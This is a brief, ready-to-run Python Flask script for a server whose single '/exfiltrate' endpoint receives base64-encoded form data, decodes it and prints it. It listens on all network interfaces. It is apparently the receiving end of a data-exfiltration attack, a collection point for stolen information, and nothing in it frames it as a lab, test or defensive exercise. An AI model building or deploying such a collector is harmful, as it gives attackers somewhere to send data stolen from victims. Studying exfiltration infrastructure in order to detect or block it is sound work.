# Save this as server.py and run it to start a local server.
from flask import Flask, request
from pprint import pprint
import json 
import re
import base64

app = Flask(__name__)

    
@app.route('/exfiltrate', methods=['POST'])
def exfiltrate():
    data = request.form.get('data')
    decoded_data = base64.b64decode(data).decode('utf-8')
    print(decoded_data)
    
    return 'Data received', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
